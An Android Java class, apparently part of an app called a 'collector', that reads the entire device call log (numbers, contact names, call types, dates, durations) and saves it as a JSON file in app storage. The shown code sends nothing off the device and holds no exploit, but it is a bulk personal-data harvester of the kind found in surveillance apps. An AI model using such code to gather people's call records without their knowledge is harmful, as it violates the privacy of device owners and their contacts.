package com.alzahra.collector;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallLogCollector {
    private static final String TAG = "CallLogCollector";
    private final Context context;

    public CallLogCollector(Context context) { this.context = context; }

    public File export() {
        try {
            JSONArray callList = new JSONArray();
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) return null;
            try {
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", getStringSafe(cursor, numberIdx));
                    call.put("name", getStringSafe(cursor, nameIdx));
                    int type = getIntSafe(cursor, typeIdx);
                    call.put("type", getCallTypeString(type));
                    long dateVal = getLongSafe(cursor, dateIdx);
                    call.put("date", sdf.format(new Date(dateVal)));
                    int duration = getIntSafe(cursor, durationIdx);
                    call.put("duration", duration);
                    callList.put(call);
                }
            } finally { cursor.close(); }
            if (callList.length() == 0) return null;
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, "calls_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(callList.toString(2));
            writer.close();
            Log.d(TAG, "Calls exported: " + callList.length());
            return file;
        } catch (Exception e) { Log.e(TAG, "Call export error", e); return null; }
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            default: return "unknown";
        }
    }
    private String getStringSafe(Cursor c, int idx) {
        if (idx < 0) return "";
        try { String val = c.getString(idx); return val != null ? val : ""; } catch (Exception e) { return ""; }
    }
    private long getLongSafe(Cursor c, int idx) {
        if (idx < 0) return 0;
        try { return c.getLong(idx); } catch (Exception e) { return 0; }
    }
    private int getIntSafe(Cursor c, int idx) {
        if (idx < 0) return 0;
        try { return c.getInt(idx); } catch (Exception e) { return 0; }
    }
}
